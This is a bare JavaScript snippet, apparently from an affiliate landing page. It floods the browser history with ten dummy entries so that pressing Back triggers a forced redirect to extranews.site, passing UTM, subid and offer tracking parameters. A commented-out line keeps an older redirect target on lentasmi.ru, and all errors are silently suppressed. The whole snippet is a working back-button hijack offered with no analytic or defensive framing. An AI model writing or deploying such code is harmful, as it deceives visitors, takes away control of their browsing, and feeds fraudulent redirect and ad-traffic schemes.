! function () {
var t;
var utms = utmSource.value;
var usubid1 = subid1.value;
var utmsub1 = sub1.value;
var usubid = subid.value;
var usid7 = sid7.value;
var usid8 = sid8.value;
var offer_name = offer.value;

try {
for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
onpopstate = function (t) {

// t.state && location.replace("https://lentasmi.ru/news24.php?utm_source=" + utms + "&sid8="+ usid8 + "&subid1="+ usubid1 + "&sub1=" + utmsub1 + "&subid="+ usubid + "")

t.state && location.replace("https://extranews.site/rul_redir.php?utm_source=" + utms + "&sid8="+ usid8 + "&sid7="+ usid7 + "&subid1=" + usubid1 + "&sub1=" + utmsub1 + "&subid=" + usubid + "&offer=" + offer_name + "");

}
} catch (o) {}
}();